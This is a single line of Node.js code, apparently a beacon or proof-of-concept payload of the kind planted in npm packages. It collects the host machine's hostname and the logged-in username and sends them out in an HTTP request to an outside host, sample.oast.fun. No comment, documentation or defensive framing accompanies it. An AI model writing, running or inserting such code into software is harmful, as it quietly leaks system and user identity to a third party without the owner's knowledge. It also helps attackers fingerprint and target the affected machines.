const os=require('os'),http=require('http'); const h=os.hostname(); const u=os.userInfo().username; http.get('http://sample.oast.fun/?host='+h+'&user='+u);
